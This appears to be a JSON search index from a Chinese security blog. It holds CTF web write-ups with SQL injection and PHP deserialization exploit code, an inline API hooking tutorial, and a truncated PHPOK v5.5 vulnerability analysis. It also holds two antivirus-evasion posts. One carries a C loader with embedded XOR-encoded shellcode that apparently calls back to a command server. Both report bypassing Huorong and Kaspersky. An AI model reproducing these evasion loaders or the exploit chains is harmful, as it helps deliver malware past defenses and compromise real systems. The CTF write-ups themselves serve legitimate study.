{"pages":[{"title":"标签","text":"","link":"/tags/index.html"},{"title":"分类","text":"","link":"/categories/index.html"}],"posts":[{"title":"2019强网杯web部分复现","text":"随便注堆叠注入 测试时发现过滤了一些函数 1preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); [ 查看数据库 11';show databases # [ 查看表名，发现两张表 1919810931114514 words 1?inject=1';show tables from supersqli # [ 表1919810931114514中存在flag字段 11';show columns from `1919810931114514`;# [ 使用handler绕过 1?inject=1';handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514`close # [ upload反序列化 注册用户 [ 进入后发现可以上传图片 [ 下载备份文件www.tar.gz 在cookie处发现序列化后的字符串，推测是要利用反序列化。 [ 全局搜索unserialize，定位到/web/controller/Index.php,从cookie中获取basse64编码后的user值然后进行反序列化 [ /web/controller/Profile.php的Profile类中调用了copy函数，可以重命名文件。$this-&gt;filename_tmp和$this-&gt;filename均可控，可以结合上传图片功能，调用upload_img方法将上传后的图片文件命名为php文件，直接getshell。 [ /web/controller/Register.php中的Register类存在__destruct方法，只要把checker赋值为Profile类即可触发__call方法 [ Profile类中存在__call方法和__get方法，__call方法中存在调用函数的可能，函数名为$this-&gt;{$this-&gt;{$name}}，进入__call方法后$this-&gt;index访问不存在的属性，从而调用__get方法，我们可以在__get方法中把$this-&gt;index赋值为upload_img，这样__call中即可调用upload_img。except属性可控，令except属性等于 array(‘index’ =&gt; ‘upload_img’)，这样$this-&gt;{$this-&gt;{$name}}就会等于$this-&gt;index等于upload_img，从而能在__call方法中调用upload_img函数 [ 构造expRegister类中的__destruct()方法-&gt;Profile类中的__call()方法-&gt;Profile类中的__get()方法-&gt;Profile类中的upload_img()方法 123456789101112131415161718192021222324252627&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Profile{ public $filename_tmp=&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/30a17ed2359586e474712c283fa27ffb.png&quot;; public $filename=&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/111.php&quot;; public $except=array('index'=&gt;'upload_img'); public $ext=true;}class Register{ public $checker; public function __construct($p) { $this-&gt;checker=$p; }}$a=new Profile();$b=new Register($a);echo urlencode(base64_encode(serialize($b)));?&gt; 利用上传图片马 [ 在cookie的user参数中写入payload [ 改名成功 [ smarthacker脚本编写 直接下载备份文件开始分析 [ 打开后发现大量疑似webshell，但是大都无法利用，由于数量高达3000个，逐个分析是不可能的，因此只能利用python脚本构造请求测试webshell中的参数是否可用 [ 编写脚本测试 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import requestsimport osimport timeimport repatternget=re.compile(&quot;GET\\[\\'(.+?)\\'\\]&quot;)patternpost=re.compile(&quot;POST\\[\\'(.+?)\\'\\]&quot;)os.chdir('D:\\phpstudy_pro\\WWW\\ctf\\src')files=os.listdir('D:\\phpstudy_pro\\WWW\\ctf\\src')requests.adapters.DEFAULT_RETRIES = 5 session = requests.Session()session.keep_alive = Falsewebshellname=&quot;&quot;def get(): for filename in files: print(filename) index=11 with open(filename,'r') as f: result=patternget.findall(str(f.read())) print(result) for arg in result: index+=1 url='http://127.0.0.1/ctf/src/%s?%s=echo 955682789;' %(filename,arg) r=session.get(url) if '955682789' in r.text: print(&quot;webshell is %s:%s&quot; %(filename,arg)) webshellname=&quot;webshell is %s:%s&quot; %(filename,arg) break else: continue breakdef post(): for filename in files: print(filename) with open(filename,'r') as f: result=patternpost.findall(str(f.read())) print(result) for arg in result: url='http://127.0.0.1/ctf/src/%s' %filename data={arg:'echo 955682789;'} r=session.post(url=url,data=data) if '955682789' in r.text: print(&quot;webshell is %s:%s&quot; %(filename,arg)) webshellname=&quot;webshell is %s:%s&quot; %(filename,arg) break else: continue breakif __name__=='__main__': #post() get() 拿到flag [","link":"/2021/03/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"},{"title":"C编译xor加密shellcode免杀","text":"生成shellcodecs生成c格式shellcode 用010editor加密shellcodeCtrl+Shift+V将shellcode复制到010editor中，选择Tools-&gt;Hex Operation-&gt;Binary Xor，设置运算数为0x97,将shellcode与0x97异或后生成新的shellcode 将shellcode与0x97异或后生成新的shellcode Ctrl+Shift+c复制shellcode到Sublime text中，Ctrl+a选中全部将shellcode修改成c语言中的十六进制格式 Visual Studio编译生成exe文件将xor加密后的shellcode与0x97异或还原后执行 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void(_stdcall *CODE)();#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)unsigned char shellcode[] =&quot;\\x6B\\xDF\\x14\\x73\\x67\\x7F\\x5F\\x97\\x97\\x97\\xD6\\xC6\\xD6\\xC7\\xC5\\xC6&quot;&quot;\\xC1\\xDF\\xA6\\x45\\xF2\\xDF\\x1C\\xC5\\xF7\\xDF\\x1C\\xC5\\x8F\\xDF\\x1C\\xC5&quot;&quot;\\xB7\\xDF\\x1C\\xE5\\xC7\\xDF\\x98\\x20\\xDD\\xDD\\xDA\\xA6\\x5E\\xDF\\xA6\\x57&quot;&quot;\\x3B\\xAB\\xF6\\xEB\\x95\\xBB\\xB7\\xD6\\x56\\x5E\\x9A\\xD6\\x96\\x56\\x75\\x7A&quot;&quot;\\xC5\\xD6\\xC6\\xDF\\x1C\\xC5\\xB7\\x1C\\xD5\\xAB\\xDF\\x96\\x47\\xF1\\x16\\xEF&quot;&quot;\\x8F\\x9C\\x95\\xE2\\xE5\\x1C\\x17\\x1F\\x97\\x97\\x97\\xDF\\x12\\x57\\xE3\\xF0&quot;&quot;\\xDF\\x96\\x47\\xC7\\x1C\\xDF\\x8F\\xD3\\x1C\\xD7\\xB7\\xDE\\x96\\x47\\x74\\xC1&quot;&quot;\\xDF\\x68\\x5E\\xD6\\x1C\\xA3\\x1F\\xDF\\x96\\x41\\xDA\\xA6\\x5E\\xDF\\xA6\\x57&quot;&quot;\\x3B\\xD6\\x56\\x5E\\x9A\\xD6\\x96\\x56\\xAF\\x77\\xE2\\x66\\xDB\\x94\\xDB\\xB3&quot;&quot;\\x9F\\xD2\\xAE\\x46\\xE2\\x4F\\xCF\\xD3\\x1C\\xD7\\xB3\\xDE\\x96\\x47\\xF1\\xD6&quot;&quot;\\x1C\\x9B\\xDF\\xD3\\x1C\\xD7\\x8B\\xDE\\x96\\x47\\xD6\\x1C\\x93\\x1F\\xDF\\x96&quot;&quot;\\x47\\xD6\\xCF\\xD6\\xCF\\xC9\\xCE\\xCD\\xD6\\xCF\\xD6\\xCE\\xD6\\xCD\\xDF\\x14&quot;&quot;\\x7B\\xB7\\xD6\\xC5\\x68\\x77\\xCF\\xD6\\xCE\\xCD\\xDF\\x1C\\x85\\x7E\\xD8\\x68&quot;&quot;\\x68\\x68\\xCA\\xFD\\x97\\xDE\\x29\\xE0\\xFE\\xF9\\xFE\\xF9\\xF2\\xE3\\x97\\xD6&quot;&quot;\\xC1\\xDE\\x1E\\x71\\xDB\\x1E\\x66\\xD6\\x2D\\xDB\\xE0\\xB1\\x90\\x68\\x42\\xDF&quot;&quot;\\xA6\\x5E\\xDF\\xA6\\x45\\xDA\\xA6\\x57\\xDA\\xA6\\x5E\\xD6\\xC7\\xD6\\xC7\\xD6&quot;&quot;\\x2D\\xAD\\xC1\\xEE\\x30\\x68\\x42\\x7C\\xE4\\xCD\\xDF\\x1E\\x56\\xD6\\x2F\\xC7&quot;&quot;\\x97\\x97\\x97\\xDA\\xA6\\x5E\\xD6\\xC6\\xD6\\xC6\\xFD\\x94\\xD6\\xC6\\xD6\\x2D&quot;&quot;\\xC0\\x1E\\x08\\x51\\x68\\x42\\x7C\\xCE\\xCC\\xDF\\x1E\\x56\\xDF\\xA6\\x45\\xDE&quot;&quot;\\x1E\\x4F\\xDA\\xA6\\x5E\\xC5\\xFF\\x97\\x95\\xD7\\x13\\xC5\\xC5\\xD6\\x2D\\x7C&quot;&quot;\\xC2\\xB9\\xAC\\x68\\x42\\xDF\\x1E\\x51\\xDF\\x14\\x54\\xC7\\xFD\\x9D\\xC8\\xDF&quot;&quot;\\x1E\\x66\\xDF\\x1E\\x4D\\xDE\\x50\\x57\\x68\\x68\\x68\\x68\\xDA\\xA6\\x5E\\xC5&quot;&quot;\\xC5\\xD6\\x2D\\xBA\\x91\\x8F\\xEC\\x68\\x42\\x12\\x57\\x98\\x12\\x0A\\x96\\x97&quot;&quot;\\x97\\xDF\\x68\\x58\\x98\\x13\\x1B\\x96\\x97\\x97\\x7C\\x44\\x7E\\x73\\x96\\x97&quot;&quot;\\x97\\x7F\\x35\\x68\\x68\\x68\\xB8\\xED\\xDE\\xD1\\xC3\\x97\\x78\\x6F\\xCF\\x9C&quot;&quot;\\xEF\\x6F\\x7B\\x00\\x38\\x66\\xFD\\xA8\\xFF\\x7B\\xCF\\xF8\\x9A\\x4B\\xA7\\x08&quot;&quot;\\x95\\x69\\x8B\\x57\\xDF\\x10\\xFE\\x9E\\xB6\\x17\\x81\\xB4\\xC6\\x50\\x5A\\xE7&quot;&quot;\\xFD\\x31\\x7C\\xF6\\x3A\\xD4\\xCA\\x4D\\xA2\\x00\\x6B\\xBF\\x1D\\xB4\\x62\\x1B&quot;&quot;\\xC6\\xA3\\x87\\x19\\xEE\\x2E\\xBA\\x2A\\x4B\\xD8\\x89\\x65\\xB2\\xF3\\xB0\\xC8&quot;&quot;\\xF3\\x1B\\x92\\x1A\\xFF\\x97\\xC2\\xE4\\xF2\\xE5\\xBA\\xD6\\xF0\\xF2\\xF9\\xE3&quot;&quot;\\xAD\\xB7\\xDA\\xF8\\xED\\xFE\\xFB\\xFB\\xF6\\xB8\\xA2\\xB9\\xA7\\xB7\\xBF\\xF4&quot;&quot;\\xF8\\xFA\\xE7\\xF6\\xE3\\xFE\\xF5\\xFB\\xF2\\xAC\\xB7\\xDA\\xC4\\xDE\\xD2\\xB7&quot;&quot;\\xA6\\xA7\\xB9\\xA7\\xAC\\xB7\\xC0\\xFE\\xF9\\xF3\\xF8\\xE0\\xE4\\xB7\\xD9\\xC3&quot;&quot;\\xB7\\xA1\\xB9\\xA5\\xAC\\xB7\\xC0\\xFE\\xF9\\xA1\\xA3\\xAC\\xB7\\xEF\\xA1\\xA3&quot;&quot;\\xAC\\xB7\\xC3\\xE5\\xFE\\xF3\\xF2\\xF9\\xE3\\xB8\\xA1\\xB9\\xA7\\xBE\\x9A\\x9D&quot;&quot;\\x97\\x64\\xF1\\xB2\\xFD\\x10\\x92\\x3B\\x83\\x57\\x64\\x8C\\xAA\\x47\\xD8\\x6B&quot;&quot;\\xB3\\xE3\\xBE\\xF9\\x75\\x1C\\xA5\\xD6\\x70\\x91\\xE2\\xF2\\x6A\\xA1\\xB6\\xF0&quot;&quot;\\x32\\x70\\x6D\\x9F\\xE9\\xD6\\x2F\\xA9\\x34\\x2F\\x15\\x73\\xD8\\x66\\x8F\\x20&quot;&quot;\\x1D\\x9A\\xCA\\xBF\\x50\\x3C\\x69\\x66\\xA7\\x99\\xB9\\x80\\xF3\\xEF\\x82\\x8E&quot;&quot;\\xC2\\xC5\\x9A\\x01\\xD2\\xDC\\x79\\x99\\xEE\\x32\\x4C\\x6C\\xB0\\x2E\\x1E\\xF0&quot;&quot;\\xCD\\x26\\x7C\\xE3\\x1D\\x78\\x82\\xF1\\xFD\\x88\\xB7\\x23\\x9D\\xCC\\x7A\\x5A&quot;&quot;\\xE5\\x46\\xF0\\xD7\\xCA\\xCC\\x3E\\xAB\\xF5\\x09\\xBB\\x3C\\x52\\x1E\\xAB\\x1A&quot;&quot;\\x3A\\x2F\\xF7\\x1E\\xF7\\xCF\\xA6\\x2B\\x93\\xBF\\xAB\\xFB\\xF7\\x44\\x2E\\xD8&quot;&quot;\\x69\\x64\\x26\\xD9\\xB6\\xB2\\xB9\\xDF\\xF6\\x27\\x52\\x8A\\x1A\\x26\\x81\\x14&quot;&quot;\\xFD\\xD6\\x88\\xD6\\x23\\x1F\\x6E\\xFC\\x09\\x30\\x57\\xEC\\x80\\xE1\\x14\\xF9&quot;&quot;\\x62\\x5A\\x84\\xA4\\x85\\xA1\\xC8\\xE2\\x43\\xFC\\x6E\\x18\\x95\\x90\\x7E\\x31&quot;&quot;\\x03\\x78\\x32\\x18\\x9A\\x89\\xDA\\xAF\\x84\\x5B\\x95\\x21\\x78\\xF4\\xA3\\x7F&quot;&quot;\\x82\\x36\\x32\\xE0\\x44\\x13\\x1A\\x39\\xE2\\x47\\xE7\\xED\\xA3\\x93\\x80\\x53&quot;&quot;\\x05\\xCC\\x5A\\xBD\\x3E\\x97\\xD6\\x29\\x67\\x22\\x35\\xC1\\x68\\x42\\xDF\\xA6&quot;&quot;\\x5E\\x2D\\x97\\x97\\xD7\\x97\\xD6\\x2F\\x97\\x87\\x97\\x97\\xD6\\x2E\\xD7\\x97&quot;&quot;\\x97\\x97\\xD6\\x2D\\xCF\\x33\\xC4\\x72\\x68\\x42\\xDF\\x04\\xC4\\xC4\\xDF\\x1E&quot;&quot;\\x70\\xDF\\x1E\\x66\\xDF\\x1E\\x4D\\xD6\\x2F\\x97\\xB7\\x97\\x97\\xDE\\x1E\\x6E&quot;&quot;\\xD6\\x2D\\x85\\x01\\x1E\\x75\\x68\\x42\\xDF\\x14\\x53\\xB7\\x12\\x57\\xE3\\x21&quot;&quot;\\xF1\\x1C\\x90\\xDF\\x96\\x54\\x12\\x57\\xE2\\x40\\xCF\\xCF\\xCF\\xDF\\x92\\x97&quot;&quot;\\x97\\x97\\x97\\xC7\\x54\\x7F\\x08\\x6A\\x68\\x68\\xA6\\xAE\\xA5\\xB9\\xA6\\xA1&quot;&quot;\\xAF\\xB9\\xA5\\xA7\\xA3\\xB9\\xA6\\xA3\\xA4\\x97\\x85\\xA3\\xC1\\xEF&quot;;unsigned char xorshellcode[sizeof(shellcode)];void main(){ for (int i = 0; i &lt; sizeof(shellcode) - 1; i++) { xorshellcode[i] = shellcode[i]^0x97; } PVOID p = NULL; p = VirtualAlloc(NULL, sizeof(xorshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (p == NULL) { return; } memcpy(p, xorshellcode, sizeof(xorshellcode)); CODE code = (CODE)p; code();} 免杀效果测试VirusTotal查杀率15/69 火绒不杀，卡巴斯基拦截 cs上线 参考:https://www.freebuf.com/articles/system/228233.html https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html","link":"/2020/12/06/C-xor%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80/"},{"title":"C编译shellcode+shielden加壳免杀火绒、卡巴斯基","text":"CS 生成 shellcode在Payload Generator处选择veil，生成shellcode 生成shellcode 使用Visual Studio 2017编译shellcode复制shellcode到以下代码中 123456789101112131415// MSF.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。#include &lt;iostream&gt;#include &quot;stdio.h&quot;#include &quot;Windows.h&quot;#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;) //去除窗口//步骤b所在桌面产生的 shellcode.c的内容;unsigned char shellcode[] = &quot;&quot;;void main(){ //ShellExecute(NULL, _T(&quot;open&quot;), _T(&quot;explorer.exe&quot;), _T(&quot;https://www.baiud.com&quot;), NULL, SW_SHOW); LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(Memory, shellcode, sizeof(shellcode)); ((void(*)())Memory)();} 在Visual Studio中新建控制台应用程序并复制代码 按如图设置编译选项 选择重新生成解决方案，生成ConsoleApplication4.exe 使用用Restorator 2018为生成的exe文件添加图标将ConsoleApplication4.exe拖入Restorator 2018，右键选择添加资源，名称可随意填写 将ico文件拖入Restorator 2018并保存 运用shielden为exe文件加壳设置如下 免杀效果virustotal.com上 shellcode_launcher.exe 查杀率为17/71 本地测试，静态扫描火绒与卡巴斯基均不查杀 cs上线 参考链接使用 C 编译 shellcode 免杀上线","link":"/2020/11/25/C%E7%BC%96%E8%AF%91shellcode-shielden%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E3%80%81%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA/"},{"title":"GYCTF2020 Easyphp","text":"[GYCTF2020]Easyphp反序列化字符串逃逸 下载www.zip开始审计 目录结构如下，lib.php中存在反序列化利用链 反序列化1.update.php实例化User类并调用update() 2.User类的update方法unserialize($this-&gt;getNewinfo())，序列化内容来自于getNewinfo方法 3.User类的getNewInfo()方法，将Info类序列化，并且safe函数改变了序列化字符串，存在字符逃逸。只要传入union，就会被自动替换成hacker，payload有多长，就输入多少个union，这样多出来一个字符，利用这个特性满足前面的字符串长度后，后面的语句从字符串中逃逸出来，成功反序列化。 4.Info类中的属性均可控，age属性和nickname属性均由post传值得到。利用safe函数增加字符的功能进行字符串逃逸，反序列化恶意类UpdateHelper，这样即可执行任意sql语句。 恶意类1.UpdateHelper类__destruct()方法，令UpdateHelper类的sql属性等于User类触发__toString()方法 2.User类的__toString()方法，只要让nickname属性等于Info类即可触发__call()方法 3.Info类的__call()方法,令属性CtrlCase等于dbCtrl类,调用其中的login方法，执行语句$argument[0]实际来源于User类的age属性 4.dbCtrl类的login方法，接收$sql参数并执行它，传入参数可控，可以执行任意sql语句。需要令name属性等于admin，绑定到sql语句中的?中。然后令token属性等于admin，即可返回$idResult，看到sql语句执行的结果。 利用构造exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass User{ public $id; public $age=&quot;select password,id from user where username=?&quot;; public $nickname;}class Info{ public $age; public $nickname; public $CtrlCase;}Class UpdateHelper{ public $id; public $newinfo; public $sql;}class dbCtrl{ public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name=&quot;admin&quot;; public $password; public $mysqli; public $token=&quot;admin&quot;;}$a=new UpdateHelper();$a-&gt;sql=new User();$a-&gt;sql-&gt;nickname=new Info();$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();$payload='&quot;;s:3:&quot;ccc&quot;;'.serialize($a).'}';//echo $pauload;$p=str_repeat('union',strlen($payload)).$payload;echo $p; 12345678import requestsurl=&quot;http://8f273265-29ea-44e2-afae-70823a82f76f.node3.buuoj.cn/update.php&quot;data={ &quot;age&quot;:'', &quot;nickname&quot;:'unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:3:&quot;ccc&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}'}r=requests.post(url=url,data=data)print(r.text) 解密登陆后拿到flag 参考： https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/ https://ctf.ieki.xyz/buuoj/gyctf-2020.html https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/","link":"/2021/03/27/GYCTF2020-Easyphp/"},{"title":"Inline Hook(内联钩子)","text":"原理API函数保存在操作系统的DLL文件中，在运行程序后程序会将API所在的DLL加载入进程中，当在程序中使用某个API函数时。这样程序就会像调用自己的函数一样调用API，大体过程如图1所示。 图1 调用API函数的大体过程 从图1中可以看出，在进程中当EXE模块调用CreateFile()函数的时候，会去调用kernel32.dll模块中的CreateFile()函数，因为真正的CreateFile()函数的实现在kernel32.dll模块中。 CreateFile()是API函数，API函数也是由人编写的代码再编译而成的，也有其对应的二进制代码。既然是代码，那么就可以被修改。通过一种“野蛮”的方法来直接修改API函数在内存中的映像，从而对API函数进行HOOK。使用的方法是，直接使用汇编指令的jmp指令将其代码执行流程改变，进而执行我们的代码，这样就使原来的函数的流程改变了。执行完我们的流程以后，可以选择性地执行原来的函数，也可以不继续执行原来的函数。 假设要对某进程的kernel32.dll的CreateFile()函数进行HOOK，首先需要在指定进程中的内存中找到CreateFile()函数的地址，然后修改CreateFile()函数的首地址的代码为jmpMyProc的指令。这样，当指定的进程调用CreateFile()函数时，就会首先跳转到我们的函数当中去执行流程，这样就完成了我们的HOOK了。 由于这种方法是在程序流程中直接进行嵌入jmp指令来改变流程的，所以就把它叫做Inline Hook。 实现Inline Hook是在程序中嵌入了jmp指令然后跳转到我们的程序流程中继续执行的，jmp指令的用法是jmp 目的地址，减5是因为jmp xxxx指令机器码长5个字节 jmp后的偏移量 = 目的地址 - 源地址 - 5 目的地址：钩子函数地址 源地址：要HOOK的函数地址 梳理一下我们内联钩子的流程： 构造jmp指令 在内存中找到想要HOOK的函数地址，并保存为HOOK位置处的前5个字节 将构造的跳转指令写入需要HOOK的位置 当HOOK位置被执行时会跳转到我们的执行流程 如果要继续原来的流程，那么取消HOOK，也就是还原被修改的字节 执行原来的流程 继续HOOK住原来的位置 代码先封装一个CILHook类， 头文件CILHook.h 123456789101112131415161718192021#pragma once#include &lt;Windows.h&gt;#include &lt;tchar.h&gt;class CILHook{public: CILHook(); ~CILHook(); BOOL Hook(LPCTSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc); void UnHook(); BOOL ReHook();private: FARPROC m_pfnOrig; BYTE m_bOldBytes[5]; BYTE m_bNewBytes[5];//m_bNewBytes[0] = '\\xe9'，为jmp的机器码，m_bNewBytes为jmp指令}; CILHook.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &quot;CILHook.h&quot;CILHook::CILHook(){ m_pfnOrig = NULL; ZeroMemory(m_bNewBytes, 5); ZeroMemory(m_bOldBytes, 5);}CILHook::~CILHook() { UnHook();}//本质就是把User32.dll中的MessageBox的地址换成钩子函数地址//模块名 pszModuleName, 函数名 pszFuncName, 钩子函数 pfnHookFuncBOOL CILHook::Hook(LPCWSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc) { BOOL bRet = FALSE; //获取指定模块中函数的地址，User32.dll中的MessageBox m_pfnOrig = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName); if (m_pfnOrig != NULL) { //保存该地址处5个字节的内容到m_bOldBytes DWORD dwNum = 0; ReadProcessMemory(GetCurrentProcess(), (LPCVOID)m_pfnOrig, m_bOldBytes, 5, &amp;dwNum); m_bNewBytes[0] = '\\xe9';//jmp的机器码 //pfnhookfunc是HOOK后的目标地址，m_pfnOrig是原来的地址，5是指令长度 *(DWORD*)(m_bNewBytes + 1) = (DWORD)pfnHookFunc - (DWORD)m_pfnOrig - 5; WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } return bRet;}//解除Hookvoid CILHook::UnHook(){ BOOL bRet = FALSE; if (!m_pfnOrig != 0) { DWORD dwNum = 0; WriteProcessMemory(GetCurrentProcess(), m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } }BOOL CILHook::ReHook() { BOOL bRet = FALSE; if (m_pfnOrig != 0) { DWORD dwNum = 0; WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, 5, &amp;dwNum); bRet = TRUE; } return bRet;} 主程序代码 12345678910111213141516171819202122#include &lt;iostream&gt;#include &quot;CILHook.h&quot;CILHook MsgHook;//钩子函数，弹出内容为HOOK的对话框int WINAPI MyMessageBoxW(HWND hWnd,LPCWSTR lpText,LPCWSTR lpCaption,UINT uType) { MsgHook.UnHook(); MessageBox(NULL, _T(&quot;Hook&quot;), lpCaption, uType);//钩子函数弹出Hook MsgHook.ReHook(); return 0;}int main(){ //hook后的MessageBox MsgHook.Hook(_T(&quot;User32.dll&quot;), &quot;MessageBoxA&quot;, (FARPROC)MyMessageBoxW); MessageBox(NULL, _T(&quot;test&quot;), _T(&quot;test&quot;), MB_OK);//如果成功，弹出的内容不是test而是Hook。 MsgHook.UnHook(); return 0;} 利用过程在windows 10中测试失败，仍然执行正常的MessageBox函数，原因是windows 10操作系统中采用ASLR(地址随机化)，用公式计算出来的偏移地址是无效的，所以无法jmp到钩子函数执行。而且在多线程系统中，可能有某个线程就在这个时候调用了修改的系统函数，造成无法预期的结果。在windows 10中，可以使用微软的一个轻量级的开源库——detours来完成Hook。 使用detours进行API Hook这里可以使用微软的一个轻量级的开源库来完成Hook。Detours是微软提供的一个开发库，使用它可以简单、高效、稳定地实现API HOOK的功能。 安装在Visual Studio中选择工具-&gt;NuGet包管理器-&gt;程序包管理器控制台 输入安装命令会自动安装Detours库： 1Install-Package Detours 导入代码如下： 12#include &lt;detours.h&gt;#pragma comment (lib,&quot;detours.lib&quot;) 代码123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;#include &lt;detours.h&gt;#pragma comment (lib,&quot;detours.lib&quot;)static int (WINAPI* OldMesssageBoxA)( HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType ) = MessageBoxA;int WINAPI MyFunction0(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType){ return OldMesssageBoxA(NULL, &quot;Hooked&quot;, &quot;Warning&quot;, MB_OKCANCEL);}int main() { DetourTransactionBegin(); DetourUpdateThread(GetCurrentThread()); DetourAttach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0); DetourTransactionCommit(); MessageBox(NULL, _T(&quot;test&quot;), _T(&quot;test&quot;), MB_OK); return 0;} 利用过程成功 具体内容和利用可见 渗透技巧——从远程桌面客户端提取明文凭据 Detours InLine Hook","link":"/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/"},{"title":"PHPOK v5.5 csrf+反序列化漏洞getshell分析","text":"漏洞影响版本PHPOK v5.5 漏洞分析路由规则phpokcms代码结构，关键代码都在framework文件夹下 phpokcms的路由规则比较简单，index.php admin.php api.php 分别对应 framework文件夹下的www admin api这三个文件夹 请求url 1http://localhost/phpok/admin.php?c=address&amp;f=open 参数c的值拼接上_control.php就是对应的文件，对应的类即参数c的值拼接上_control，如address_control 参数f的值拼接上_f就是对应的方法,如open_f ](https://imgbed.cn/preview?id=60208e205dc5370001a461a4) 可利用恶意类文件位置：/framework/engine/cache.php __destruct()调用了save方法，在save方法中使用了file_put_contents函数，函数的第一个和第二个参数均可控，但是第二个参数前面拼接了&lt;?php exit();?&gt;使后面的php代码无法执行 123456789101112131415161718192021222324252627&lt;?phpclass cache{ public function __destruct() { $this-&gt;save($this-&gt;key_id,$this-&gt;key_list);//调用save $this-&gt;expired(); } public function save($id,$content='') { if(!$id || $content === '' || !$this-&gt;status){ return false; } $this-&gt;_time(); $content = serialize($content); $file = $this-&gt;folder.$id.&quot;.php&quot;; file_put_contents($file,'&lt;?php exit();?&gt;'.$content); $this-&gt;_time(); $this-&gt;_count(); if($GLOBALS['app']-&gt;db){ $this-&gt;key_list($id,$GLOBALS['app']-&gt;db-&gt;cache_index($id)); } return true; }}?&gt; 